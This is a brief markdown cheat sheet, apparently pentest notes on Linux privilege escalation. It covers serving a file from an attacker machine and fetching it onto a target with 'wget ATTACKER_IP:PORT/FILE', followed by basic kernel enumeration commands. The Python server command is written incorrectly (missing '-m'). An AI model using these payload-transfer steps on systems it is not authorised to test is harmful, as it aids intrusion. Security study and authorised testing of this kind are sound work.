# Linux Privilege Escalation

## Helpers

### Getting files to the target

#### Python HTTP server
```bash
# Attacker machine, in dir of file
python3 http.server PORT

# Target machine
wget ATTACKER_IP:PORT/FILE
```

## Local enumeration

### Kernel

```bash
# Get kernel version
uname -r

# Get all system ifnormation
uname -a
```
